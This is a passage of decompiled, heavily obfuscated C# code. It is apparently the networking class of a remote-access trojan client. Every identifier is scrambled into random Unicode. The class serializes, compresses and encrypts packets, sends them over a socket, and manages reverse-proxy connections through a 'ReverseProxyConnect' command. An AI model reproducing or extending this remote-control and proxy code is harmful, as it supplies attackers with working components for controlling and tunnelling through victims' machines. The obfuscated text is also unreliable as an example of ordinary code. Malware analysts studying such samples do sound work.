              this.뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936 = 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.윮ꡀ\uE8E5墪뀙㭜煆餼\uFFFD䑞꿜㢤\uF204쏰\u0F15欁篑ᓋ賹\uFFFD;
              this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 = (byte[]) null;
              this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB = 0;
              this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A = 0;
            }
            if (this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 == 0)
            {
              flag1 = false;
              continue;
            }
            continue;
          default:
            continue;
        }
      }
      if (this.뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936 == 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.윮ꡀ\uE8E5墪뀙㭜煆餼\uFFFD䑞꿜㢤\uF204쏰\u0F15欁篑ᓋ賹\uFFFD)
        this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A = 0;
      this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅 = 0;
      this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 = 0;
    }
  }

  public void \u27BEᐄ顜\u32E3큍엿㝦ꁄ\uF331芰辫纰\uEBD6佖\uE4D4\uEC03퉯ྞ\uE927镋<T>(T packet) where T : 灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5
  {
    try
    {
      if (!this.Connected || (object) packet == null)
        return;
      lock (this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶)
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          try
          {
            this.Serializer.Serialize((Stream) memoryStream, (object) packet);
          }
          catch (Exception ex)
          {
            this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
            return;
          }
          byte[] array = memoryStream.ToArray();
          this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶.Enqueue(array);
          this.\uE0A9킋㷒凭\u2B37ẞ\u2B8C\u2698㺇㪕ｧ᮳侯箋읃㕊\uF8AB짚ﶿ瓘((灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5) packet, (long) array.Length, array);
          lock (this.绚̛斺礫堷ᚉ㤢ᘦ쿠矱㚪㳫貌슿觱㚍䞵\uE6D4躂独)
          {
            if (this.㹕튐讹뛙\u16F9汰溰쒕椀ჶ\u175E뒼흰ὖ夣혴ꉥ妒\u089B乯)
              return;
            this.㹕튐讹뛙\u16F9汰溰쒕椀ჶ\u175E뒼흰ὖ夣혴ꉥ妒\u089B乯 = true;
          }
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.皰㞯ﲈ娨鸅\u23C6\uE812휑樂\uFFFD㞍뿓縗䳍쑛\u2AF5\uF331䋞朱岑));
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public void 屮\uE6E8䐷赿\uEC15\uE682贚战釤\u00AF鱇셾獷놟䠳\uF86F勂\uFFFD\uECFE蕉<T>(T packet) where T : 灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5
  {
    try
    {
      this.\u27BEᐄ顜\u32E3큍엿㝦ꁄ\uF331芰辫纰\uEBD6佖\uE4D4\uEC03퉯ྞ\uE927镋<T>(packet);
      while (this.㹕튐讹뛙\u16F9汰溰쒕椀ჶ\u175E뒼흰ὖ夣혴ꉥ妒\u089B乯)
        Thread.Sleep(10);
    }
    catch (Exception ex)
    {
    }
  }

  private void 皰㞯ﲈ娨鸅\u23C6\uE812휑樂\uFFFD㞍뿓縗䳍쑛\u2AF5\uF331䋞朱岑(object state)
  {
    while (this.Connected)
    {
      byte[] payload;
      lock (this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶)
      {
        if (this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶.Count == 0)
        {
          this.\uFFFD加û䮪볙髞\uEA02\u3333潓\uFFFD㺎ɣ䯒ᣝᠿ룬蹬슓ᆒ㶣();
          return;
        }
        payload = this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶.Dequeue();
      }
      try
      {
        this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.Send(this.\uF6EDᣎ闯蝇ᗂ蔜螎\uE511埈\uEA8Bꎦ태䡙䬪塯\uF02D\uE146듫\uE8EF㻮(payload));
      }
      catch (Exception ex)
      {
        this.簘卡怑卆\u2A24歛ᰭ\uF523酿竈\uEB3F숼還阚ꖫ誮ᶁ䔡踃ꘇ(ex);
        this.\uFFFD加û䮪볙髞\uEA02\u3333潓\uFFFD㺎ɣ䯒ᣝᠿ룬蹬슓ᆒ㶣(true);
        return;
      }
    }
    this.\uFFFD加û䮪볙髞\uEA02\u3333潓\uFFFD㺎ɣ䯒ᣝᠿ룬蹬슓ᆒ㶣(true);
  }

  private byte[] \uF6EDᣎ闯蝇ᗂ蔜螎\uE511埈\uEA8Bꎦ태䡙䬪塯\uF02D\uE146듫\uE8EF㻮(byte[] payload)
  {
    try
    {
      payload = ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.生螐ꥐ俍谒\u1AE7\uFFFDﳳ\uF4DFஒ貊䨤\uE80B蟐\uE20C孏팔畫俧射(payload);
      payload = ᥣ뺟覈놗뺿\uF27B셖杇喰\uFFFD䳮\u2565蒵ﷰᬛ斧㞮\u0F3C軟韗.周薞\uD7A7饮渡㭪졲麹殪\uE8C7毾鐭䘑菊ꬼ쁪\uE043จꬅ\uFB08(payload);
      byte[] destinationArray = new byte[payload.Length + this.HEADER_SIZE];
      Array.Copy((Array) BitConverter.GetBytes(payload.Length), (Array) destinationArray, this.HEADER_SIZE);
      Array.Copy((Array) payload, 0, (Array) destinationArray, this.HEADER_SIZE, payload.Length);
      return destinationArray;
    }
    catch (Exception ex)
    {
    }
    return (byte[]) null;
  }

  private void \uFFFD加û䮪볙髞\uEA02\u3333潓\uFFFD㺎ɣ䯒ᣝᠿ룬蹬슓ᆒ㶣(bool clear = false)
  {
    try
    {
      lock (this.绚̛斺礫堷ᚉ㤢ᘦ쿠矱㚪㳫貌슿觱㚍䞵\uE6D4躂独)
        this.㹕튐讹뛙\u16F9汰溰쒕椀ჶ\u175E뒼흰ὖ夣혴ꉥ妒\u089B乯 = false;
      if (!clear)
        return;
      lock (this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶)
        this.딻鳃컾걄裣Ɖ虐\uE420㙬䱺ᐇࡃ釉撰㟸\uF243졊\u26B0\u33D0뙶.Clear();
    }
    catch (Exception ex)
    {
    }
  }

  public void 铭ꂠୋ柄蜿魤\uE877禕㫨龚췼手뤣妧\uFFFD\uFFFDᵴ\uF2D3\uF52C䲀()
  {
    try
    {
      if (this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4 != null)
      {
        this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4.Close();
        this.伂鬂१\u269E花짴駙璣ჲḤೣ\uF873塹\uE386\uF890㾈蛋\uF133\uF54A\u22D4 = (Socket) null;
        this.\uFBD2炗赺㼲昔㼧鳻\u2BDF芎ʷ횚턢ꑵ腆\uFFFD췅ⶀ粝\u22AD罅 = 0;
        this.駧聂郮劈鴃\uF3A0扤囗镑㴋\uED9C깻\uFFFD仮ꞁ율\u24EF軽츝\uF28A = 0;
        this.頟蒟晥똽\uF2DF\u0A3D\u2070桊᥌\u2807썂͏\uFFFD䶑㥢볝럧궒\uEC0Aᨆ = 0;
        this.ꀆ琊㟲픻䄿㔹ẅ䊿ﮘ\u270F瘽\u1B67\u0F04槮ȯ晥㥉뎩삪幪 = 0;
        this.Ｐ椌\u2201思悀瓝엹梊ꆼꯢ켪ޡ㦎偤䯹娼ꃦ㒴ꅮ\u26EB = 0;
        this.\u33D8擱副ꝩઃ쉺孹輘ﳱ钭\u0AFC䁳顯풲힛䋛ဖ诞嬣㾕 = (byte[]) null;
        this.뛝ॲ뾫쒓ꯪ\uFFFD勇姴億臂ꡌ擿啲\uF1BF\uF41F\u22A0\u2F78隣\uE13D\u2936 = 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛.윮ꡀ\uE8E5墪뀙㭜煆餼\uFFFD䑞꿜㢤\uF204쏰\u0F15欁篑ᓋ賹\uFFFD;
        if (this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍 != null)
        {
          lock (this.\uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝)
          {
            try
            {
              foreach (ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳 ﳥ쯁뗾逡蹖飊煂눮咶᮫Ļ벻踻抄퉳 in this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍)
                ﳥ쯁뗾逡蹖飊煂눮咶᮫Ļ벻踻抄퉳.酂鞄ࠎ䭣๑ᖥ竼엇黆뤢蘁嫗㒟ꚏ\u2468鵝溁놼刻\uF495();
            }
            catch (Exception ex)
            {
            }
          }
        }
        if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 != null)
        {
          匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Dispose();
          匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 = (UnsafeStreamCodec) null;
        }
      }
      this.獻攳툡\uE969㣻\uF125杠槩ᮤ鱠\u0D64\uF30Cኗ磜燫躯턒전歆ꭾ(false);
    }
    catch (Exception ex)
    {
    }
  }

  public void \uE947ḃ黸ϕ秔㐺ꕬ譢熩忉磛괖\uFFFD꼻嗃墭鄶\uEE91ܨ迲(ReverseProxyConnect command)
  {
    lock (this.\uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝)
      this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍.Add(new ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳(command, this));
  }

  public ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳 ꛕ唭澹矸\uE011銭썙\uE39B륌粇艖哯ﾍꢨ岧㞪終劮\u1C87\uFFFD(
    int connectionId)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.䋞\u33D8ꦶӼᕂ\u32CE\uA7D7䜍\uF07C쀍毦멵ổ犗\u32D8\uA70Bጤ픟ℬᎼ 䋞ꦶӼᕂ䜍쀍毦멵ổ犗ጤ픟ℬᎼ = new 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨.䋞\u33D8ꦶӼᕂ\u32CE\uA7D7䜍\uF07C쀍毦멵ổ犗\u32D8\uA70Bጤ픟ℬᎼ();
    // ISSUE: reference to a compiler-generated field
    䋞ꦶӼᕂ䜍쀍毦멵ổ犗ጤ픟ℬᎼ.䐲㫦\uF4E8뮛鑻\uF6DE츹䦴ᅄ巒ꗉ\u1BF6䜘왐\uF7EC\uFFFD켜㓼频尉 = connectionId;
    lock (this.\uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝)
    {
      // ISSUE: reference to a compiler-generated method
      return this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍.FirstOrDefault<ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳>(new Func<ﳥ쯁뗾逡\u2FC1蹖飊煂\u2FD1눮咶᮫\uEF0EĻ\uFFFD\uF130벻踻抄퉳, bool>(䋞ꦶӼᕂ䜍쀍毦멵ổ犗ጤ픟ℬᎼ.捷髣\uF45F\uFFFD鸪誙鎽얉\uE2CB\u1CFE\u2774柲ﰉ콧䎚遊\u2051弲䬥聀));
    }
  }

  public void 쨤丶Ɲ쿩\uE935ᕿ椷䗀쯎籁뫛硫쐚鴐ᷔw\uEC44\uECF0吝拗(int connectionId)
  {
    try
    {
      lock (this.\uEBFAв徝늏苟琂埊거\uEE0A\uE065뤽眡᱘\u338C蠇叧ⲫ넯‬퀝)
      {
        for (int index = 0; index < this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍.Count; ++index)
        {
          if (this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍[index].ConnectionId == connectionId)
          {
            this.礸\uFFFD\u104A懈扚홍蒽搱๐궁교돟鲊잌鹡좾\uFFFDᐺ\uF1D3븍.RemoveAt(index);
            break;
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public delegate void ㅱ蛍澹\uF24DⳆᜌ楛緛ᄖ绯\u208C\u2974絈\u25E4얛෭㐖\u2027哚\uE1D5(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 s,
    Exception ex);

  public delegate void \uE85Cꭜ\u2587漌鮔뜛ఖ\u296B棔偸浞鬢뵒\u24FE갨ᷘ맔\uE359㣈諸(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 s,
    bool connected);

  public delegate void 䓼섳\uFFFD弆嬨럛嫬蝸\uF0AA᪴苠쒁楘Ὥ닒弛끴澕竀젟(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 s,
    灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5 packet);

  public delegate void 㤆搿砘㺀募拚\uFFFD蓘邑土駹㯴흸ఇ帜\uEB7D捩薡굲뿼(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 s,
    灧Ȫ휁\u29E5踢\uE54B氅ஜ\uFFFD䶨躡\uF18B叕욇ꊲꜻ붔\u28F7뉓\u0AF5 packet,
    long length,
    byte[] rawData);

  public enum 闚ॼ\uF7A0彊㔤\uEC64ⶄ횞ﴲ杅껿ᒶ䋡\uE8ECә\uF5F0ܑ胯\u175A䚛
  {
    윮ꡀ\uE8E5墪뀙㭜煆餼\uFFFD䑞꿜㢤\uF204쏰\u0F15欁篑ᓋ賹\uFFFD,
    勁\u284D\u0BD2ఫḮ혦峑䤀\uF6E1䗡㐓\uE9FD學똭ᓢ\uEA2B쌔헩俱臣,
  }
}
